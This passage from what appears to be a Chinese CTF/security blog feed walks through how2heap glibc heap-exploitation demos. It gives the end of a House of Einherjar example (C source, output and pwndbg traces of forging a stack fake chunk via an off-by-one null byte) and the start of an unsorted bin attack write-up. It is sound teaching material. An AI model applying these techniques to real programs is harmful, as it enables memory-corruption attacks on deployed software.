set\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(b);<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">//如果我们在free b之前分配另一个chunk,我们需要做两件事</span><br>    <span class="hljs-comment">//if we allocate another chunk before we free b we will need to</span><br>    <span class="hljs-comment">//do two things:</span><br><br>    <span class="hljs-comment">//1)我们将需要调整我们的fake chunk的size来使得fake_chunk+fake_chunk的size指针在我们所能控制的区域内</span><br>    <span class="hljs-comment">//1) We will need to adjust the size of our fake chunk so that</span><br>    <span class="hljs-comment">//fake_chunk + fake_chunk&#x27;s size points to an area we control</span><br>    <br>    <span class="hljs-comment">//2)我们将需要在我们控制的地址写我们的fake chunk的size</span><br>    <span class="hljs-comment">//2) we will need to write the size of our fake chunk</span><br>    <span class="hljs-comment">//at the location we control.</span><br>    <br>    <span class="hljs-comment">//在做了这两件事情之后，当unlink被调用的时候，我们的Fake chunk就将通过check</span><br>    <span class="hljs-comment">//After doing these two things, when unlink gets called, our fake chunk will</span><br>    <span class="hljs-comment">//pass the size(P) == prev_size(next_chunk(P)) test.</span><br><br>    <span class="hljs-comment">//否则我们需要确定我们的fake chunk可以抵御荒野？？？(荒野这里有点迷离</span><br>    <span class="hljs-comment">//otherwise we need to make sure that our fake chunk is up against the</span><br>    <span class="hljs-comment">//wilderness</span><br><br>    <span class="hljs-comment">//现在我们再调用malloc的时候，返回的时候就该是我们fake chunk的地址了</span><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);<br>    d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, d);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="程序运行结果"><a href="#程序运行结果" class="headerlink" title="程序运行结果"></a>程序运行结果</h2><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">Welcome <span class="hljs-keyword">to</span> House <span class="hljs-keyword">of</span> Einherjar!<br>Tested <span class="hljs-keyword">in</span> Ubuntu <span class="hljs-number">16.04</span> <span class="hljs-number">64</span>bit.<br>This technique can be used <span class="hljs-keyword">when</span> you have an <span class="hljs-keyword">off</span>-<span class="hljs-keyword">by</span>-one <span class="hljs-keyword">into</span> a malloc<span class="hljs-comment">&#x27;ed region with a null byte.</span><br><br>We allocate <span class="hljs-number">0</span>x38 bytes <span class="hljs-keyword">for</span> <span class="hljs-comment">&#x27;a&#x27;</span><br><span class="hljs-symbol">a:</span> <span class="hljs-number">0</span>x1767010<br>Since we want <span class="hljs-keyword">to</span> overflow <span class="hljs-comment">&#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding: 0x38</span><br><br>We create a fake chunk wherever we want, <span class="hljs-keyword">in</span> this <span class="hljs-keyword">case</span> we<span class="hljs-comment">&#x27;ll create the chunk on the stack</span><br>However, you can also create the chunk <span class="hljs-keyword">in</span> the heap <span class="hljs-built_in">or</span> the bss, <span class="hljs-keyword">as</span> <span class="hljs-type">long</span> <span class="hljs-keyword">as</span> you know its address<br>We <span class="hljs-keyword">set</span> our fwd <span class="hljs-built_in">and</span> bck pointers <span class="hljs-keyword">to</span> point at the fake_chunk <span class="hljs-keyword">in</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> pass the unlink checks<br>(although we could <span class="hljs-keyword">do</span> the unsafe unlink technique here <span class="hljs-keyword">in</span> some scenarios)<br>Our fake chunk at <span class="hljs-number">0</span>x7ffc0cadecb0 looks <span class="hljs-built_in">like</span>:<br>prev_size (<span class="hljs-built_in">not</span> used): <span class="hljs-number">0</span>x100<br><span class="hljs-symbol">size:</span> <span class="hljs-number">0</span>x100<br><span class="hljs-symbol">fwd:</span> <span class="hljs-number">0</span>x7ffc0cadecb0<br><span class="hljs-symbol">bck:</span> <span class="hljs-number">0</span>x7ffc0cadecb0<br><span class="hljs-symbol">fwd_nextsize:</span> <span class="hljs-number">0</span>x7ffc0cadecb0<br><span class="hljs-symbol">bck_nextsize:</span> <span class="hljs-number">0</span>x7ffc0cadecb0<br><br>We allocate <span class="hljs-number">0</span>xf8 bytes <span class="hljs-keyword">for</span> <span class="hljs-comment">&#x27;b&#x27;.</span><br><span class="hljs-symbol">b:</span> <span class="hljs-number">0</span>x1767050<br><br>b.size: <span class="hljs-number">0</span>x101<br>b.size <span class="hljs-built_in">is</span>: (<span class="hljs-number">0</span>x100) | prev_inuse = <span class="hljs-number">0</span>x101<br>We overflow <span class="hljs-comment">&#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;</span><br>b.size: <span class="hljs-number">0</span>x100<br>This <span class="hljs-built_in">is</span> easiest <span class="hljs-keyword">if</span> b.size <span class="hljs-built_in">is</span> a multiple <span class="hljs-keyword">of</span> <span class="hljs-number">0</span>x100 so you don<span class="hljs-comment">&#x27;t change the size of b, only its prev_inuse bit</span><br><span class="hljs-keyword">If</span> it had been modified, we would need a fake chunk inside b <span class="hljs-keyword">where</span> it will <span class="hljs-keyword">try</span> <span class="hljs-keyword">to</span> consolidate the <span class="hljs-keyword">next</span> chunk<br><br>We write a fake prev_size <span class="hljs-keyword">to</span> the last <span class="hljs-number">8</span> bytes <span class="hljs-keyword">of</span> a so that it will consolidate <span class="hljs-keyword">with</span> our fake chunk<br>Our fake prev_size will be <span class="hljs-number">0</span>x1767040 - <span class="hljs-number">0</span>x7ffc0cadecb0 = <span class="hljs-number">0</span>xffff8003f4c88390<br><br>Modify fake chunk<span class="hljs-comment">&#x27;s size to reflect b&#x27;s new prev_size</span><br>Now we free b <span class="hljs-built_in">and</span> this will consolidate <span class="hljs-keyword">with</span> our fake chunk since b prev_inuse <span class="hljs-built_in">is</span> <span class="hljs-built_in">not</span> <span class="hljs-keyword">set</span><br>Our fake chunk size <span class="hljs-built_in">is</span> now <span class="hljs-number">0</span>xffff8003f4ca9351 (b.size + fake_prev_size)<br><br>Now we can <span class="hljs-keyword">call</span> malloc() <span class="hljs-built_in">and</span> it will begin <span class="hljs-keyword">in</span> our fake chunk<br><span class="hljs-keyword">Next</span> malloc(<span class="hljs-number">0</span>x200) <span class="hljs-built_in">is</span> at <span class="hljs-number">0</span>x7ffc0cadecc0<br></code></pre></td></tr></table></figure><h2 id="关键部分调试"><a href="#关键部分调试" class="headerlink" title="关键部分调试"></a>关键部分调试</h2><p>断点如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs cpp">  <span class="hljs-number">24</span>   a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x38</span>);<br>► <span class="hljs-number">25</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;a: %p\n&quot;</span>, a);<br>  <span class="hljs-number">26</span><br><br>  <span class="hljs-number">41</span>     fake_chunk[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">// bck</span><br>  <span class="hljs-number">42</span>     fake_chunk[<span class="hljs-number">4</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//fwd_nextsize</span><br>  <span class="hljs-number">43</span>     fake_chunk[<span class="hljs-number">5</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//bck_nextsize</span><br>► <span class="hljs-number">44</span><br>  <span class="hljs-number">45</span><br><br>  <span class="hljs-number">57</span>   b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf8</span>);<br>► <span class="hljs-number">58</span>     <span class="hljs-type">int</span> real_b_size = <span class="hljs-built_in">malloc_usable_size</span>(b);<br><br>  <span class="hljs-number">69</span>   a[real_a_size] = <span class="hljs-number">0</span>;<br>► <span class="hljs-number">70</span>   <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><br>  <span class="hljs-number">79</span>     <span class="hljs-type">size_t</span> fake_size = (<span class="hljs-type">size_t</span>)((b-<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>) - (<span class="hljs-type">uint8_t</span>*)fake_chunk);<br>► <span class="hljs-number">80</span>     <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b-<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>, fake_chunk, fake_size);<br><br>► <span class="hljs-number">81</span>     *(<span class="hljs-type">size_t</span>*)&amp;a[real_a_size-<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>)] = fake_size;<br><br>  <span class="hljs-number">83</span>     <span class="hljs-comment">//Change the fake chunk&#x27;s size to reflect b&#x27;s new prev_size</span><br>  <span class="hljs-number">84</span>     <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nModify fake chunk&#x27;s size to reflect b&#x27;s new prev_size\n&quot;</span>);<br>► <span class="hljs-number">85</span>     fake_chunk[<span class="hljs-number">1</span>] = fake_size;<br><br>  <span class="hljs-number">89</span>     <span class="hljs-built_in">free</span>(b);<br>► <span class="hljs-number">90</span>     <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-number">104</span>     d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br>► <span class="hljs-number">105</span>     <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, d);<br><br></code></pre></td></tr></table></figure><p>好了，下面直接开始调试，首先是chunk a</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">65</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603040</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">135105</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>然后在我们给我们的fake_chunk赋值之后</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; p/x fake_chunk<br><span class="hljs-number">$2</span> = &#123;<span class="hljs-number">0x100</span>, <span class="hljs-number">0x100</span>, <span class="hljs-number">0x7fffffffe600</span>, <span class="hljs-number">0x7fffffffe600</span>, <span class="hljs-number">0x7fffffffe600</span>, <span class="hljs-number">0x7fffffffe600</span>&#125;<br></code></pre></td></tr></table></figure><p>也就是</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">$3</span> = &#123;<br>  prev_size = <span class="hljs-number">256</span>,<br>  size = <span class="hljs-number">256</span>,<br>  fd = <span class="hljs-number">0x7fffffffe600</span>,<br>  bk = <span class="hljs-number">0x7fffffffe600</span>,<br>  fd_nextsize = <span class="hljs-number">0x7fffffffe600</span>,<br>  bk_nextsize = <span class="hljs-number">0x7fffffffe600</span><br>&#125;<br></code></pre></td></tr></table></figure><p>随后程序malloc了b</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">65</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603040</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">257</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603140</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">134849</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>然后给a[real_a_size]赋0x00,也就是</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x603048</span><br><span class="hljs-number">0x603048</span>:       <span class="hljs-number">0</span>x0000<span class="hljs-number">000000000100</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603058</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603068</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603078</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603088</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>之后设置fake_si’ze为b和fake_chunk的差值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x b-0x10</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">16 = 0x603040</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x &amp;fake_chunk</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">17 = 0x7fffffffe600</span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x 0x603040-0x7fffffffe600</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">18 = 0xffff800000604a40</span><br><span class="hljs-meta prompt_">pwndbg&gt;</span><br></code></pre></td></tr></table></figure><p>之后程序将b的pre_size设为了fake_size</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs nix">pwndbg<span class="hljs-operator">&gt;</span> heap<br><span class="hljs-number">0</span>x603000 FASTBIN &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">65</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x603040 &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">18446603336227506752</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">256</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br><span class="hljs-number">0</span>x603140 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">134849</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br>pwndbg<span class="hljs-operator">&gt;</span> p<span class="hljs-symbol">/x</span> <span class="hljs-number">18446603336227506752</span><br>$<span class="hljs-number">30</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>xffff800000604a40<br></code></pre></td></tr></table></figure><p>一切就绪之后,程序将fake_chunk的szie设为了fake_chunk</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; p/x fake_chunk<br><span class="hljs-number">$32</span> = &#123;<span class="hljs-number">0x100</span>, <span class="hljs-number">0xffff800000604a40</span>, <span class="hljs-number">0x7fffffffe600</span>, <span class="hljs-number">0x7fffffffe600</span>, <span class="hljs-number">0x7fffffffe600</span>, <span class="hljs-number">0x7fffffffe600</span>&#125;<br></code></pre></td></tr></table></figure><p>也就是</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">$34</span> = &#123;<br>  prev_size = <span class="hljs-number">0x100</span>,<br>  size = <span class="hljs-number">0xffff800000604a40</span>,<br>  fd = <span class="hljs-number">0x7fffffffe600</span>,<br>  bk = <span class="hljs-number">0x7fffffffe600</span>,<br>  fd_nextsize = <span class="hljs-number">0x7fffffffe600</span>,<br>  bk_nextsize = <span class="hljs-number">0x7fffffffe600</span><br>&#125;<br></code></pre></td></tr></table></figure><p>现在我们再free b,程序通过pre_size就会去找我们的fake chunk,又发现我们的fake_chunk也是free态,因此就会与我们的fake_chunk合并,现在我们再malloc的话</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">p/x d-0x10</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">39 = 0x7fffffffe600</span><br></code></pre></td></tr></table></figure><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>程序首先malloc了chunk a(0x38)</p><p>之后呢在栈上创建了fake chunk,并且伪造了fake chunk的结构</p><p>随后程序又malloc了chunk b(0xf8),b和top chunk相邻</p><p>我们计算量b和fake chunk的地址差后,将b的pre_size设为了我们的差值,并把b的pre_inuse置0,之后free掉了b</p><p>此时b就通过pre_size找到了我们的fake chunk并且与我们的fake chunk合并了,现在我们再申请一个chunk,就会从fake chunk那分配了</p><p>over~</p><p>文章首发于安全客，转载请著名出处，文章链接<a href="https://www.anquanke.com/post/id/197667">https://www.anquanke.com/post/id/197667</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>how2heap总结计划四</title>
    <link href="/2020/01/21/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E5%9B%9B/"/>
    <url>/2020/01/21/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E5%9B%9B/</url>
    
    <content type="html"><![CDATA[<blockquote><p>布谷布谷!</p></blockquote><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>ctf-wiki.github.io<span class="hljs-regexp">/ctf-wiki/</span>pwn/<br>https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">85127</span><br>https:<span class="hljs-regexp">//</span>dangokyo.me<span class="hljs-regexp">/2018/</span><span class="hljs-number">04</span><span class="hljs-regexp">/07/</span>a-revisit-to-large-bin-<span class="hljs-keyword">in</span>-glibc/<br>https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>system/<span class="hljs-number">209096</span>.html<br>https:<span class="hljs-regexp">//</span>bbs.pediy.com/thread-<span class="hljs-number">223283</span>.htm<br>https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">5177</span>?accounttraceid=d0a1f6bd7256460885a64d78c885c8caznnf<br>https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">183877</span><br></code></pre></td></tr></table></figure><h1 id="0x01-unsorted-bin-attack"><a href="#0x01-unsorted-bin-attack" class="headerlink" title="0x01 unsorted bin attack"></a>0x01 unsorted bin attack</h1><h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>unsoted bin attack的杀伤力虽然不够,但也是不可小视的辅助攻击方式,第一个我们就先来看unsorted bin attack吧</p><p>wiki上的<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/">介绍</a></p><p>这里简要介绍一下:</p><p>在_int_malloc中有这么一段代码,他会在unsorted bin取出时被调用:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">unsorted_chunks (av)-&gt;bk <span class="hljs-operator">=</span> bck<span class="hljs-comment">;</span><br>bck-&gt;fd <span class="hljs-operator">=</span> unsorted_chunks (av)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>那么这个bck是什么呢?</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">bck</span> <span class="hljs-operator">=</span> victim-&gt;bk<br></code></pre></td></tr></table></figure><p>因此我们只需要控制bk指针就可以让bck位置可控，而我们的bck-&gt;fd也就可控了，此时就可以往任意地址写一个东西,但是写的东西不归我们控制,因此只能打辅助2333</p><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>这个代码真心少啊我说2333,同样的,我加了一点注释删了些东西</p><p>作者的话的大概意思:</p><p>本demo使用unsorted bin attack技巧将一个很大的无符号long型值写进了栈里</p><p>在实际中,unsorted bin attack常常用于为其他的攻击做辅助,比如覆写global_max_fast来为fastbin attack做辅助</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;<br>        <span class="hljs-comment">//stack_var就是我们的攻击目标</span><br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Let&#x27;s first look at the target we want to rewrite on stack:\n&quot;</span>);<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;%p: %ld\n\n&quot;</span>, &amp;stack_var, stack_var);<br><br>        <span class="hljs-type">unsigned</span> 